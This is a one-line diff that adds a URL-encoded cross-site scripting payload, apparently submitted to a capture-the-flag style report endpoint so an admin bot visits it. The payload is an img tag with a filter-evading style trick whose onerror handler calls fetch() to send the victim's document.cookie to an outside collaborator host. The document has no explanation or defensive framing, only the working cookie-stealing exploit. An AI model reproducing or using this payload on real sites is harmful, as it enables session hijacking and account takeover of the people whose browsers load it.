@@ -1,0 +1,1 @@
+http://20.115.83.90:1337/report.php?url=http%3a%2f%2f127%2e0%2e0%2e1%2f%3fxss%3d%3Cimg%20src%3d%22a%20%3Cstyle%3E%22%3E%3Cstyle%3Eh1%20%7bcolor%3a%20white%3C%2fstyle%3E%20%22%20onerror%3dfetch%28%22http%3a%2f%2fzdg7rcb3lqhtsuix9r6uopbk0b62uuij%2eoastify%2ecom%2f%22%2econcat%28document%2ecookie%29%29%3C%2fp%3E
